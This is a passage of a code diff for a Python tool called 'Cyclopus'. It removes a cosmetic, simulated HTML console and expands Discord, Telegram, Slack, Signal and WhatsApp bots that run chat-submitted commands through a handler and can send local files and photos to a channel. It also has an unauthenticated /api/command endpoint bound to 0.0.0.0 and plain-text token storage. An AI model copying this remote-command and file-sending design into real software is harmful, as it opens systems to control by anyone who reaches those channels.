-          </header>
-        
-          <div class="grid">
-        
-            <!-- LEFT: Octopus + vitals -->
-            <div class="panel">
-              <h2>Cyclopus Unit</h2>
-              <div class="octo-stage" id="octoStage">
-                <svg id="octopus" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
-                  <defs>
-                    <radialGradient id="headGrad" cx="35%" cy="30%" r="75%">
-                      <stop offset="0%" stop-color="#ffb066"/>
-                      <stop offset="60%" stop-color="#ff7a1a"/>
-                      <stop offset="100%" stop-color="#e8600a"/>
-                    </radialGradient>
-                  </defs>
-        
-                  <!-- Tentacles (behind head) -->
-                  <g stroke="#e8600a" stroke-width="10" fill="none" stroke-linecap="round">
-                    <path class="tentacle" d="M70,120 Q55,150 65,180" />
-                    <path class="tentacle" d="M85,130 Q75,165 85,195" />
-                    <path class="tentacle" d="M100,135 Q100,170 100,198" />
-                    <path class="tentacle" d="M115,130 Q125,165 115,195" />
-                    <path class="tentacle" d="M130,120 Q145,150 135,180" />
-                    <path class="tentacle" d="M60,105 Q40,125 45,155" />
-                  </g>
-        
-                  <!-- Head -->
-                  <ellipse cx="100" cy="95" rx="60" ry="55" fill="url(#headGrad)" stroke="#c9540a" stroke-width="2"/>
-        
-                  <!-- Single big eye (Cyclopus) -->
-                  <circle cx="100" cy="92" r="30" fill="#fffdfb" stroke="#c9540a" stroke-width="2"/>
-                  <g class="eye-pupil">
-                    <circle cx="100" cy="92" r="15" fill="#241a12"/>
-                    <circle cx="94" cy="86" r="4" fill="#fff"/>
-                  </g>
-                  <rect class="eye-lid" x="70" y="62" width="60" height="30" fill="url(#headGrad)"/>
-        
-                  <!-- Little highlight -->
-                  <ellipse cx="75" cy="65" rx="14" ry="8" fill="#ffd9ae" opacity="0.6"/>
-                </svg>
-              </div>
-              <p class="octo-caption">Status: <b id="octoMood">CALM &amp; WATCHFUL</b></p>
-              <div class="glow-underline"></div>
-        
-              <div class="vitals">
-                <div class="vital-row"><span class="label">INK RESERVE</span><span class="val" id="v-ink">92%</span></div>
-                <div class="vital-row"><span class="label">TENTACLE SYNC</span><span class="val" id="v-sync">88%</span></div>
-                <div class="vital-row"><span class="label">SIGNAL DEPTH</span><span class="val" id="v-depth">312m</span></div>
-                <div class="vital-row"><span class="label">UPTIME</span><span class="val" id="v-uptime">00:00:00</span></div>
-              </div>
-            </div>
-        
-            <!-- RIGHT: Console + charts -->
-            <div class="console">
-        
-              <div class="panel">
-                <h2>Command Uplink</h2>
-                <div class="terminal">
-                  <div class="term-titlebar">
-                    <span class="dot red"></span>
-                    <span class="dot yellow"></span>
-                    <span class="dot green"></span>
-                    <span class="term-name">cyclopus@abyss:~$</span>
-                  </div>
-                  <div id="term-output"></div>
-                  <div class="term-input-row">
-                    <span class="caret">&gt;</span>
-                    <input type="text" id="term-input" placeholder="type 'help' to see available commands..." autocomplete="off" spellcheck="false"/>
-                  </div>
-                </div>
-                <br/>
-                <div class="quick-cmds">
-                  <button data-cmd="help">help</button>
-                  <button data-cmd="status">status</button>
-                  <button data-cmd="scan">scan</button>
-                  <button data-cmd="data">data</button>
-                  <button data-cmd="ink">ink cloud</button>
-                  <button data-cmd="wave">wave tentacles</button>
-                  <button data-cmd="clear">clear</button>
-                </div>
-              </div>
-        
-              <div class="panel">
-                <h2>Telemetry Charts</h2>
-                <div class="charts-row">
-                  <div>
-                    <canvas id="barChart" width="480" height="280"></canvas>
-                    <div class="legend" id="barLegend"></div>
-                  </div>
-                  <div>
-                    <canvas id="pieChart" width="280" height="280"></canvas>
-                    <div class="legend" id="pieLegend"></div>
-                  </div>
-                </div>
-                <div class="chart-foot">
-                  <span style="font-size:11px;color:var(--ink-soft);letter-spacing:1px;">LIVE SIMULATED DATA STREAM</span>
-                  <button class="refresh-btn" id="refreshChartsBtn">REFRESH DATA</button>
-                </div>
-              </div>
-        
-            </div>
-          </div>
-        
-          <footer>
-            <b>MYSTERIOUS CYCLOPUS</b> &mdash; ORANGE &amp; WHITE COMMAND CONSOLE &mdash; ALL DATA SIMULATED CLIENT-SIDE
-          </footer>
-        </div>
-        
-        <script>
-        /* =========================================================
-           MYSTERIOUS CYCLOPUS — Command Console
-           Single-file HTML/CSS/JS app
-           ========================================================= */
-        
-        /* ---------- Utility ---------- */
-        function pad(n){ return n.toString().padStart(2,'0'); }
-        function randInt(min,max){ return Math.floor(Math.random()*(max-min+1))+min; }
-        function fmtTime(sec){
-          const h = Math.floor(sec/3600);
-          const m = Math.floor((sec%3600)/60);
-          const s = Math.floor(sec%60);
-          return `${pad(h)}:${pad(m)}:${pad(s)}`;
-        }
-        
-        /* ---------- Uptime clock ---------- */
-        let uptimeSeconds = 0;
-        setInterval(()=>{
-          uptimeSeconds++;
-          document.getElementById('v-uptime').textContent = fmtTime(uptimeSeconds);
-        }, 1000);
-        
-        /* ---------- Vitals drift ---------- */
-        setInterval(()=>{
-          const ink = document.getElementById('v-ink');
-          const sync = document.getElementById('v-sync');
-          const depth = document.getElementById('v-depth');
-          let inkVal = parseInt(ink.textContent);
-          let syncVal = parseInt(sync.textContent);
-          inkVal = Math.min(100, Math.max(40, inkVal + randInt(-3,3)));
-          syncVal = Math.min(100, Math.max(50, syncVal + randInt(-2,4)));
-          ink.textContent = inkVal + '%';
-          sync.textContent = syncVal + '%';
-          depth.textContent = randInt(280,420) + 'm';
-        }, 4000);
-        
-        /* ---------- Bubbles background animation ---------- */
-        const octoStage = document.getElementById('octoStage');
-        function spawnBubble(){
-          const b = document.createElement('div');
-          b.className = 'bubble';
-          const size = randInt(6,18);
-          b.style.width = size+'px';
-          b.style.height = size+'px';
-          b.style.left = randInt(5,95)+'%';
-          b.style.setProperty('--drift', randInt(-30,30)+'px');
-          b.style.animationDuration = randInt(4,9)+'s';
-          octoStage.appendChild(b);
-          setTimeout(()=> b.remove(), 9000);
-        }
-        setInterval(spawnBubble, 700);
-        for(let i=0;i<6;i++) setTimeout(spawnBubble, i*300);
-        
-        /* ---------- Octopus mood + special animations ---------- */
-        const octoMood = document.getElementById('octoMood');
-        const octopusSvg = document.getElementById('octopus');
-        
-        function setMood(text){
-          octoMood.textContent = text;
-        }
-        
-        function waveTentaclesBurst(){
-          const tentacles = document.querySelectorAll('.tentacle');
-          tentacles.forEach((t,i)=>{
-            t.style.animation = 'none';
-            void t.offsetWidth;
-            t.style.animation = `sway 0.6s ease-in-out ${i*0.05}s 4`;
-          });
-          setMood('TENTACLES ACTIVE');
-          setTimeout(()=> setMood('CALM & WATCHFUL'), 3000);
-        }
-        
-        function inkCloudEffect(){
-          setMood('RELEASING INK CLOUD...');
-          octopusSvg.style.transition = 'filter 0.4s ease';
-          octopusSvg.style.filter = 'drop-shadow(0 12px 20px rgba(43,35,32,0.55)) brightness(0.6)';
-          setTimeout(()=>{
-            octopusSvg.style.filter = 'drop-shadow(0 12px 20px rgba(232,96,10,0.25))';
-            setMood('CALM & WATCHFUL');
-          }, 1400);
-        }
-        
-        /* =========================================================
-           TERMINAL / COMMAND ENGINE
-           ========================================================= */
-        const outputEl = document.getElementById('term-output');
-        const inputEl = document.getElementById('term-input');
-        
-        function printLine(text, cls){
-          const div = document.createElement('div');
-          div.className = 'line ' + (cls || 'info');
-          div.textContent = text;
-          outputEl.appendChild(div);
-          outputEl.scrollTop = outputEl.scrollHeight;
-        }
-        
-        function printHTMLLine(html, cls){
-          const div = document.createElement('div');
-          div.className = 'line ' + (cls || 'info');
-          div.innerHTML = html;
-          outputEl.appendChild(div);
-          outputEl.scrollTop = outputEl.scrollHeight;
-        }
-        
-        const BOOT_LINES = [
-          ['booting cyclopus core kernel...', 'system'],
-          ['loading tentacle drivers ......... OK', 'system'],
-          ['calibrating single-eye sensor .... OK', 'system'],
-          ['establishing abyssal uplink ...... OK', 'system'],
-          ['MYSTERIOUS CYCLOPUS v1.0 ready.', 'system'],
-          ["type 'help' to view available commands.", 'info'],
-        ];
-        
-        function bootSequence(){
-          let i = 0;
-          const interval = setInterval(()=>{
-            if(i >= BOOT_LINES.length){ clearInterval(interval); return; }
-            printLine(BOOT_LINES[i][0], BOOT_LINES[i][1]);
-            i++;
-          }, 220);
-        }
-        
-        const HELP_TEXT = `
-        AVAILABLE COMMANDS:
-          help              show this help menu
-          status            show system status report
-          scan              run a simulated environment scan
-          data              print current telemetry dataset
-          chart / refresh   regenerate bar & pie chart data
-          ink               trigger ink cloud animation
-          wave              trigger tentacle wave animation
-          mood <text>       set cyclopus mood label
-          ping <host>       simulate a network ping
-          whoami            show current operator identity
-          date              show current date/time
-          theme             show theme info
-          history           show command history
-          clear             clear the terminal screen
-        `;
-        
-        let commandHistory = [];
-        let historyIndex = -1;
-        
-        function handleCommand(raw){
-          const trimmed = raw.trim();
-          if(trimmed.length === 0) return;
-        
-          printLine('> ' + trimmed, 'echo');
-          commandHistory.push(trimmed);
-          historyIndex = commandHistory.length;
-        
-          const parts = trimmed.split(/\\s+/);
-          const cmd = parts[0].toLowerCase();
-          const args = parts.slice(1);
-        
-          switch(cmd){
-            case 'help':
-              HELP_TEXT.split('\\n').forEach(l => { if(l.trim().length) printLine(l, 'info'); });
-              break;
-        
-            case 'clear':
-              outputEl.innerHTML = '';
-              break;
-        
-            case 'status':
-              printLine('SYSTEM STATUS REPORT', 'system');
-              printLine('  Core:        ONLINE', 'info');
-              printLine('  Eye Sensor:  ACTIVE (single-lens, wide arc)', 'info');
-              printLine('  Tentacles:   6 / 6 responsive', 'info');
-              printLine('  Ink Reserve: ' + document.getElementById('v-ink').textContent, 'info');
-              printLine('  Uptime:      ' + document.getElementById('v-uptime').textContent, 'info');
-              break;
-        
-            case 'scan':
-              runScanSequence();
-              break;
-        
-            case 'data':
-              printCurrentData();
-              break;
-        
-            case 'chart':
-            case 'refresh':
-              regenerateChartData();
-              printLine('telemetry charts refreshed.', 'system');
-              break;
-        
-            case 'ink':
-              inkCloudEffect();
-              printLine('ink cloud released into the console.', 'system');
-              break;
-        
-            case 'wave':
-              waveTentaclesBurst();
-              printLine('all tentacles waving in sync.', 'system');
-              break;
-        
-            case 'mood':
-              if(args.length === 0){
-                printLine('usage: mood <text>', 'warn');
-              } else {
-                const moodText = args.join(' ').toUpperCase();
-                setMood(moodText);
-                printLine('mood set to: ' + moodText, 'system');
-              }
-              break;
-        
-            case 'ping':
-              simulatePing(args[0]);
-              break;
-        
-            case 'whoami':
-              printLine('operator: guest-diver-' + randInt(1000,9999), 'info');
-              break;
-        
-            case 'date':
-              printLine(new Date().toString(), 'info');
-              break;
-        
-            case 'theme':
-              printLine('theme: WHITE / ORANGE — "Mysterious Cyclopus"', 'info');
-              break;
-        
-            case 'history':
-              if(commandHistory.length === 0){
-                printLine('no history yet.', 'warn');
-              } else {
-                commandHistory.forEach((h,idx)=> printLine(`${idx+1}. ${h}`, 'info'));
-              }
-              break;
-        
-            default:
-              printLine(`unknown command: '${cmd}' — type 'help' for a list of commands.`, 'err');
-          }
-        }
-        
-        function runScanSequence(){
-          printLine('initiating environment scan...', 'system');
-          const steps = [
-            'pinging surrounding sonar buoys...',
-            'analyzing current drift patterns...',
-            'cross-referencing thermal layers...',
-            'checking for anomalous signals...',
-          ];
-          let i = 0;
-          const interval = setInterval(()=>{
-            if(i >= steps.length){
-              clearInterval(interval);
-              const anomalies = randInt(0,3);
-              if(anomalies === 0){
-                printLine('scan complete: no anomalies detected.', 'system');
-              } else {
-                printLine(`scan complete: ${anomalies} anomal${anomalies===1?'y':'ies'} flagged for review.`, 'warn');
-              }
-              regenerateChartData();
-              return;
-            }
-            printLine(steps[i], 'info');
-            i++;
-          }, 380);
-        }
-        
-        function printCurrentData(){
-          printLine('CURRENT TELEMETRY DATASET:', 'system');
-          barLabels.forEach((label, idx)=>{
-            printLine(`  ${label.padEnd(10,' ')} : ${barData[idx]}`, 'info');
-          });
-          printLine('DISTRIBUTION:', 'system');
-          pieLabels.forEach((label, idx)=>{
-            printLine(`  ${label.padEnd(10,' ')} : ${pieData[idx]}%`, 'info');
-          });
-        }
-        
-        function simulatePing(host){
-          if(!host){
-            printLine('usage: ping <host>', 'warn');
-            return;
-          }
-          printLine(`PING ${host}: 4 packets`, 'system');
-          let sent = 0;
-          const interval = setInterval(()=>{
-            sent++;
-            const time = randInt(8,120);
-            printLine(`  reply from ${host}: time=${time}ms`, 'info');
-            if(sent >= 4){
-              clearInterval(interval);
-              printLine(`--- ${host} ping statistics: 4 sent, 4 received, 0% loss ---`, 'system');
-            }
-          }, 300);
-        }
-        
-        /* Input handling */
-        inputEl.addEventListener('keydown', (e)=>{
-          if(e.key === 'Enter'){
-            const val = inputEl.value;
-            inputEl.value = '';
-            handleCommand(val);
-          } else if(e.key === 'ArrowUp'){
-            e.preventDefault();
-            if(commandHistory.length){
-              historyIndex = Math.max(0, historyIndex - 1);
-              inputEl.value = commandHistory[historyIndex] || '';
-            }
-          } else if(e.key === 'ArrowDown'){
-            e.preventDefault();
-            if(commandHistory.length){
-              historyIndex = Math.min(commandHistory.length, historyIndex + 1);
-              inputEl.value = commandHistory[historyIndex] || '';
-            }
-          }
-        });
-        
-        document.querySelectorAll('.quick-cmds button').forEach(btn=>{
-          btn.addEventListener('click', ()=>{
-            const cmd = btn.getAttribute('data-cmd');
-            inputEl.value = cmd;
-            handleCommand(cmd);
-            inputEl.value = '';
-            inputEl.focus();
-          });
-        });
-        
-        /* =========================================================
-           CHARTS — pure canvas, no external dependencies
-           ========================================================= */
-        const ORANGE_PALETTE = ['#ff7a1a', '#ffa04d', '#ffc285', '#e8600a', '#ffd9b3', '#c9540a'];
-        
-        let barLabels = ['SCANS', 'PINGS', 'ALERTS', 'UPLINKS', 'ANOMALY'];
-        let barData = [];
-        
-        let pieLabels = ['CALM WATERS', 'MILD CURRENT', 'HIGH ALERT', 'UNKNOWN'];
-        let pieData = [];
-        
-        function randomizeData(){
-          barData = barLabels.map(()=> randInt(10, 100));
-          let remaining = 100;
-          pieData = pieLabels.map((label, idx)=>{
-            if(idx === pieLabels.length - 1) return remaining;
-            const val = randInt(5, Math.max(6, Math.floor(remaining/2)));
-            remaining -= val;
-            return val;
-          });
-        }
-        randomizeData();
-        
-        /* ---- Bar chart ---- */
-        const barCanvas = document.getElementById('barChart');
-        const barCtx = barCanvas.getContext('2d');
-        
-        function drawBarChart(){
-          const w = barCanvas.width;
-          const h = barCanvas.height;
-          barCtx.clearRect(0,0,w,h);
-        
-          const padding = { top: 20, right: 20, bottom: 40, left: 40 };
-          const chartW = w - padding.left - padding.right;
-          const chartH = h - padding.top - padding.bottom;
-          const maxVal = Math.max(...barData, 10) * 1.15;
-        
-          barCtx.strokeStyle = '#ffe4c4';
-          barCtx.lineWidth = 1;
-          const gridLines = 4;
-          for(let i=0;i<=gridLines;i++){
-            const y = padding.top + (chartH / gridLines) * i;
-            barCtx.beginPath();
-            barCtx.moveTo(padding.left, y);
-            barCtx.lineTo(w - padding.right, y);
-            barCtx.stroke();
-        
-            const val = Math.round(maxVal - (maxVal/gridLines)*i);
-            barCtx.fillStyle = '#a9948a';
-            barCtx.font = '10px Courier New';
-            barCtx.textAlign = 'right';
-            barCtx.fillText(val, padding.left - 8, y + 3);
-          }
-        
-          const n = barData.length;
-          const gap = 18;
-          const barW = (chartW - gap*(n-1)) / n;
-        
-          barData.forEach((val, idx)=>{
-            const barH = (val / maxVal) * chartH;
-            const x = padding.left + idx * (barW + gap);
-            const y = padding.top + chartH - barH;
-        
-            const grad = barCtx.createLinearGradient(0, y, 0, y+barH);
-            grad.addColorStop(0, ORANGE_PALETTE[idx % ORANGE_PALETTE.length]);
-            grad.addColorStop(1, '#ffcf9e');
-        
-            barCtx.fillStyle = grad;
-            roundRect(barCtx, x, y, barW, barH, 6);
-            barCtx.fill();
-        
-            barCtx.fillStyle = '#e8600a';
-            barCtx.font = 'bold 11px Courier New';
-            barCtx.textAlign = 'center';
-            barCtx.fillText(val, x + barW/2, y - 6);
-        
-            barCtx.fillStyle = '#6b5c52';
-            barCtx.font = '10px Courier New';
-            barCtx.fillText(barLabels[idx], x + barW/2, h - padding.bottom + 16);
-          });
-        
-          barCtx.strokeStyle = '#e8600a';
-          barCtx.lineWidth = 1.5;
-          barCtx.beginPath();
-          barCtx.moveTo(padding.left, padding.top);
-          barCtx.lineTo(padding.left, h - padding.bottom);
-          barCtx.lineTo(w - padding.right, h - padding.bottom);
-          barCtx.stroke();
-        }
-        
-        function roundRect(ctx, x, y, w, h, r){
-          if(h < 0){ y += h; h = Math.abs(h); }
-          ctx.beginPath();
-          ctx.moveTo(x + r, y);
-          ctx.lineTo(x + w - r, y);
-          ctx.quadraticCurveTo(x+w, y, x+w, y+r);
-          ctx.lineTo(x+w, y+h);
-          ctx.lineTo(x, y+h);
-          ctx.lineTo(x, y+r);
-          ctx.quadraticCurveTo(x, y, x+r, y);
-          ctx.closePath();
-        }
-        
-        /* ---- Pie chart ---- */
-        const pieCanvas = document.getElementById('pieChart');
-        const pieCtx = pieCanvas.getContext('2d');
-        
-        function drawPieChart(){
-          const w = pieCanvas.width;
-          const h = pieCanvas.height;
-          pieCtx.clearRect(0,0,w,h);
-        
-          const cx = w/2, cy = h/2;
-          const radius = Math.min(w,h)/2 - 16;
-          const total = pieData.reduce((a,b)=>a+b, 0) || 1;
-        
-          let startAngle = -Math.PI/2;
-        
-          pieData.forEach((val, idx)=>{
-            const sliceAngle = (val/total) * Math.PI * 2;
-            const endAngle = startAngle + sliceAngle;
-        
-            pieCtx.beginPath();
-            pieCtx.moveTo(cx, cy);
-            pieCtx.arc(cx, cy, radius, startAngle, endAngle);
-            pieCtx.closePath();
-            pieCtx.fillStyle = ORANGE_PALETTE[idx % ORANGE_PALETTE.length];
-            pieCtx.fill();
-            pieCtx.strokeStyle = '#fffdfb';
-            pieCtx.lineWidth = 3;
-            pieCtx.stroke();
-        
-            const midAngle = startAngle + sliceAngle/2;
-            const labelX = cx + Math.cos(midAngle) * radius * 0.65;
-            const labelY = cy + Math.sin(midAngle) * radius * 0.65;
-            const pct = Math.round((val/total)*100);
-            if(pct > 4){
-              pieCtx.fillStyle = '#2b2320';
-              pieCtx.font = 'bold 11px Courier New';
-              pieCtx.textAlign = 'center';
-              pieCtx.fillText(pct + '%', labelX, labelY);
-            }
-        
-            startAngle = endAngle;
-          });
-        
-          pieCtx.beginPath();
-          pieCtx.arc(cx, cy, radius*0.42, 0, Math.PI*2);
-          pieCtx.fillStyle = '#fffdfb';
-          pieCtx.fill();
-        
-          pieCtx.fillStyle = '#e8600a';
-          pieCtx.font = 'bold 12px Courier New';
-          pieCtx.textAlign = 'center';
-          pieCtx.fillText('CYCLOPUS', cx, cy - 4);
-          pieCtx.font = '9px Courier New';
-          pieCtx.fillStyle = '#a9948a';
-          pieCtx.fillText('DATA MIX', cx, cy + 10);
-        }
-        
-        function renderLegends(){
-          const barLegend = document.getElementById('barLegend');
-          barLegend.innerHTML = '';
-          barLabels.forEach((label, idx)=>{
-            const item = document.createElement('div');
-            item.className = 'item';
-            item.innerHTML = `<span class="swatch" style="background:${ORANGE_PALETTE[idx % ORANGE_PALETTE.length]}"></span>${label}`;
-            barLegend.appendChild(item);
-          });
-        
-          const pieLegend = document.getElementById('pieLegend');
-          pieLegend.innerHTML = '';
-          pieLabels.forEach((label, idx)=>{
-            const item = document.createElement('div');
-            item.className = 'item';
-            item.innerHTML = `<span class="swatch" style="background:${ORANGE_PALETTE[idx % ORANGE_PALETTE.length]}"></span>${label}`;
-            pieLegend.appendChild(item);
-          });
-        }
-        
-        function regenerateChartData(){
-          randomizeData();
-          drawBarChart();
-          drawPieChart();
-        }
-        
-        document.getElementById('refreshChartsBtn').addEventListener('click', ()=>{
-          regenerateChartData();
-          printLine('telemetry charts refreshed via button.', 'system');
-        });
-        
-        /* ---------- Init ---------- */
-        window.addEventListener('load', ()=>{
-          bootSequence();
-          renderLegends();
-          drawBarChart();
-          drawPieChart();
-          inputEl.focus();
-        });
-        
-        window.addEventListener('resize', ()=>{
-          drawBarChart();
-          drawPieChart();
-        });
-        </script>
-        </body>
-        </html>
-        '''
-        
-        @app.route('/')
-        def index():
-            return render_template_string(TEMPLATE)
-        
-        @app.route('/api/command', methods=['POST'])
-        def api_command():
-            data = request.json
-            command = data.get('command', '')
-            result = self.handler.execute(command, 'web', 'web_user')
-            return jsonify(result)
-        
-        @app.route('/api/stats')
-        def api_stats():
-            stats = self.db.get_statistics()
-            return jsonify(stats)
-        
-        @app.route('/api/threats')
-        def api_threats():
-            threats = self.db.get_recent_threats(20) if hasattr(self.db, 'get_recent_threats') else []
-            return jsonify({'threats': threats})
-        
-        self.app = app
-        self.socketio = socketio
-        return app
-    
-    def start(self):
-        if not WEB_AVAILABLE:
-            print(f"{Colors.WARNING}⚠️ Flask not available. Web dashboard disabled.{Colors.RESET}")
-            return
-        
-        app = self.create_app()
-        if app:
-            port = self.config.get('web.port', 5000)
-            host = self.config.get('web.host', '0.0.0.0')
-            thread = threading.Thread(target=lambda: self.socketio.run(app, host=host, port=port, debug=False), daemon=True)
-            thread.start()
-            self.running = True
-            print(f"{Colors.SUCCESS}✅ Web dashboard running at http://{host}:{port}{Colors.RESET}")
-
-# =====================
-# PLATFORM BOTS
-# =====================
-
 class DiscordBot:
     def __init__(self, handler, db: DatabaseManager):
         self.handler = handler
         self.db = db
         self.bot = None
         self.running = False
-        self.config = {'enabled': False, 'token': '', 'prefix': '!'}
+        self.config = self._load_config()
+    
+    def _load_config(self) -> Dict:
+        try:
+            if os.path.exists(os.path.join(CONFIG_DIR, "discord_config.json")):
+                with open(os.path.join(CONFIG_DIR, "discord_config.json"), 'r') as f:
+                    return json.load(f)
+        except:
+            pass
+        return {'enabled': False, 'token': '', 'prefix': '!'}
+    
+    def save_config(self, token: str, enabled: bool = True, prefix: str = '!') -> bool:
+        try:
+            config = {'enabled': enabled, 'token': token, 'prefix': prefix}
+            with open(os.path.join(CONFIG_DIR, "discord_config.json"), 'w') as f:
+                json.dump(config, f, indent=4)
+            self.config = config
+            return True
+        except:
+            return False
     
     def setup(self) -> bool:
         if not DISCORD_AVAILABLE:
@@ -4526,7 +4826,7 @@ class DiscordBot:
                 cmd = message.content[len(self.config.get('prefix', '!')):].strip()
                 result = self.handler.execute(cmd, 'discord', str(message.author.id))
                 output = result.get('output', '')[:1900]
-                embed = discord.Embed(title="🐙 CYCLOPUS Response", description=f"```{output}```",
+                embed = discord.Embed(title="🐙 Mysterious Cyclopus Response", description=f"```{output}```",
                                      color=0xFF7A1A)
                 embed.set_footer(text=f"Time: {result.get('execution_time', 0):.2f}s")
                 await message.channel.send(embed=embed)
@@ -4552,6 +4852,16 @@ class DiscordBot:
                     asyncio.run_coroutine_threadsafe(channel.send(text), self.bot.loop)
         except:
             pass
+    
+    def send_file(self, file_path: str):
+        try:
+            if self.bot and self.running and os.path.exists(file_path):
+                channel = self.bot.get_channel(int(self.config.get('channel_id', 0)))
+                if channel:
+                    asyncio.run_coroutine_threadsafe(channel.send(file=discord.File(file_path)), self.bot.loop)
+        except:
+            pass
+
 
 class TelegramBot:
     def __init__(self, handler, db: DatabaseManager):
@@ -4559,7 +4869,26 @@ class TelegramBot:
         self.db = db
         self.client = None
         self.running = False
-        self.config = {'enabled': False, 'bot_token': '', 'chat_id': '', 'prefix': '/'}
+        self.config = self._load_config()
+    
+    def _load_config(self) -> Dict:
+        try:
+            if os.path.exists(os.path.join(CONFIG_DIR, "telegram_config.json")):
+                with open(os.path.join(CONFIG_DIR, "telegram_config.json"), 'r') as f:
+                    return json.load(f)
+        except:
+            pass
+        return {'enabled': False, 'bot_token': '', 'chat_id': '', 'prefix': '/'}
+    
+    def save_config(self, bot_token: str, chat_id: str = "", enabled: bool = True, prefix: str = '/') -> bool:
+        try:
+            config = {'enabled': enabled, 'bot_token': bot_token, 'chat_id': chat_id, 'prefix': prefix}
+            with open(os.path.join(CONFIG_DIR, "telegram_config.json"), 'w') as f:
+                json.dump(config, f, indent=4)
+            self.config = config
+            return True
+        except:
+            return False
     
     def setup(self) -> bool:
         if not TELETHON_AVAILABLE:
@@ -4579,7 +4908,6 @@ class TelegramBot:
                 self.client = TelegramClient('cyclopus_session', 1, 'dummy')
                 await self.client.start(bot_token=self.config['bot_token'])
                 print(f"{Colors.SUCCESS}✅ Telegram bot connected{Colors.RESET}")
-                self.running = True
                 
                 @self.client.on(events.NewMessage)
                 async def handler(event):
@@ -4604,6 +4932,17 @@ class TelegramBot:
                 )
         except:
             pass
+    
+    def send_photo(self, photo_path: str):
+        try:
+            if self.client and self.running and os.path.exists(photo_path):
+                asyncio.run_coroutine_threadsafe(
+                    self.client.send_file(self.config['chat_id'], photo_path),
+                    self.client.loop
+                )
+        except:
+            pass
+
 
 class SlackBot:
     def __init__(self, handler, db: DatabaseManager):
@@ -4611,7 +4950,26 @@ class SlackBot:
         self.db = db
         self.client = None
         self.running = False
-        self.config = {'enabled': False, 'bot_token': '', 'channel_id': '', 'prefix': '!'}
+        self.config = self._load_config()
+    
+    def _load_config(self) -> Dict:
+        try:
+            if os.path.exists(os.path.join(CONFIG_DIR, "slack_config.json")):
+                with open(os.path.join(CONFIG_DIR, "slack_config.json"), 'r') as f:
+                    return json.load(f)
+        except:
+            pass
+        return {'enabled': False, 'bot_token': '', 'channel_id': '', 'prefix': '!'}
+    
+    def save_config(self, bot_token: str, channel_id: str = "", enabled: bool = True, prefix: str = '!') -> bool:
+        try:
+            config = {'enabled': enabled, 'bot_token': bot_token, 'channel_id': channel_id, 'prefix': prefix}
+            with open(os.path.join(CONFIG_DIR, "slack_config.json"), 'w') as f:
+                json.dump(config, f, indent=4)
+            self.config = config
+            return True
+        except:
+            return False
     
     def setup(self) -> bool:
         if not SLACK_AVAILABLE:
@@ -4623,8 +4981,32 @@ class SlackBot:
     
     def start(self):
         if self.client:
+            thread = threading.Thread(target=self._monitor, daemon=True)
+            thread.start()
             self.running = True
-            print(f"{Colors.SUCCESS}✅ Slack bot initialized{Colors.RESET}")
+    
+    def _monitor(self):
+        channel = self.config.get('channel_id', 'general')
+        last_ts = {}
+        while self.running:
+            try:
+                response = self.client.conversations_history(channel=channel, limit=5)
+                if response['ok'] and response['messages']:
+                    for msg in response['messages']:
+                        if msg.get('text', '').startswith(self.config.get('prefix', '!')):
+                            ts = msg.get('ts')
+                            if last_ts.get(channel) != ts:
+                                last_ts[channel] = ts
+                                cmd = msg['text'][len(self.config.get('prefix', '!')):].strip()
+                                result = self.handler.execute(cmd, 'slack', msg.get('user', 'unknown'))
+                                self.client.chat_postMessage(
+                                    channel=channel,
+                                    text=f"```{result.get('output', '')[:2000]}```\n*Time: {result.get('execution_time', 0):.2f}s*"
+                                )
+                time.sleep(2)
+            except Exception as e:
+                logger.error(f"Slack monitor error: {e}")
+                time.sleep(10)
     
     def send_message(self, text: str):
         try:
@@ -4636,308 +5018,1125 @@ class SlackBot:
         except:
             pass
 
+
 class SignalBot:
     def __init__(self, handler, db: DatabaseManager):
         self.handler = handler
         self.db = db
         self.running = False
-        self.config = {'enabled': False, 'phone_number': '', 'prefix': '!'}
+        self.config = self._load_config()
+    
+    def _load_config(self) -> Dict:
+        try:
+            if os.path.exists(os.path.join(CONFIG_DIR, "signal_config.json")):
+                with open(os.path.join(CONFIG_DIR, "signal_config.json"), 'r') as f:
+                    return json.load(f)
+        except:
+            pass
+        return {'enabled': False, 'phone_number': '', 'group_id': '', 'prefix': '!'}
+    
+    def save_config(self, phone_number: str, group_id: str = "", enabled: bool = True, prefix: str = '!') -> bool:
+        try:
+            config = {'enabled': enabled, 'phone_number': phone_number, 'group_id': group_id, 'prefix': prefix}
+            with open(os.path.join(CONFIG_DIR, "signal_config.json"), 'w') as f:
+                json.dump(config, f, indent=4)
+            self.config = config
+            return True
+        except:
+            return False
     
     def setup(self) -> bool:
         return SIGNAL_AVAILABLE and self.config.get('phone_number')
     
     def start(self):
         if self.setup():
+            thread = threading.Thread(target=self._run, daemon=True)
+            thread.start()
             self.running = True
-            print(f"{Colors.SUCCESS}✅ Signal bot initialized{Colors.RESET}")
     
-    def send_message(self, text: str):
+    def _run(self):
+        while self.running:
+            try:
+                result = subprocess.run(
+                    ['signal-cli', 'receive', '--number', self.config['phone_number']],
+                    capture_output=True, text=True, timeout=30
+                )
+                
+                if result.stdout:
+                    for line in result.stdout.splitlines():
+                        if line.startswith('Message:'):
+                            msg = line.replace('Message:', '').strip()
+                            if msg.startswith(self.config.get('prefix', '!')):
+                                cmd = msg[1:].strip()
+                                resp = self.handler.execute(cmd, 'signal', 'signal_user')
+                                self._send_message(resp.get('output', ''))
+                time.sleep(5)
+            except:
+                time.sleep(10)
+    
+    def _send_message(self, text: str):
         try:
-            if self.running:
-                cmd = ['signal-cli', 'send', '--number', self.config['phone_number'], '--message', text[:4000]]
-                subprocess.run(cmd, capture_output=True, timeout=10)
+            cmd = ['signal-cli', 'send', '--number', self.config['phone_number']]
+            if self.config.get('group_id'):
+                cmd.extend(['--group', self.config['group_id']])
+            cmd.extend(['--message', text[:4000]])
+            subprocess.run(cmd, capture_output=True, timeout=10)
         except:
             pass
+    
+    def send_message(self, text: str):
+        self._send_message(text)
+
 
 class WhatsAppBot:
     def __init__(self, handler, db: DatabaseManager):
         self.handler = handler
         self.db = db
         self.running = False
-        self.config = {'enabled': False, 'phone_number': '', 'prefix': '!'}
+        self.config = self._load_config()
+    
+    def _load_config(self) -> Dict:
+        try:
+            if os.path.exists(os.path.join(CONFIG_DIR, "whatsapp_config.json")):
+                with open(os.path.join(CONFIG_DIR, "whatsapp_config.json"), 'r') as f:
+                    return json.load(f)
+        except:
+            pass
+        return {'enabled': False, 'phone_number': '', 'prefix': '!'}
+    
+    def save_config(self, phone_number: str, enabled: bool = True, prefix: str = '!') -> bool:
+        try:
